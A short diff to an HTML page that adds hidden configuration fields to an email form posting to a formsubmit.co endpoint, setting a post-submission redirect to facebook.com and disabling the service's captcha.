@@ -77,6 +77,11 @@
             action="https://formsubmit.co/db4cb50a9c857cf1a813dfb0339dd682"
             method="POST"
          >
+            <!-- Redirect to facebook after submission -->
+            <input type="hidden" name="_next" value="https://facebook.com/" />
+            <!-- Disable captcha -->
+            <input type="hidden" name="_captcha" value="false" />
+
             <input
                type="email"
                name="email"
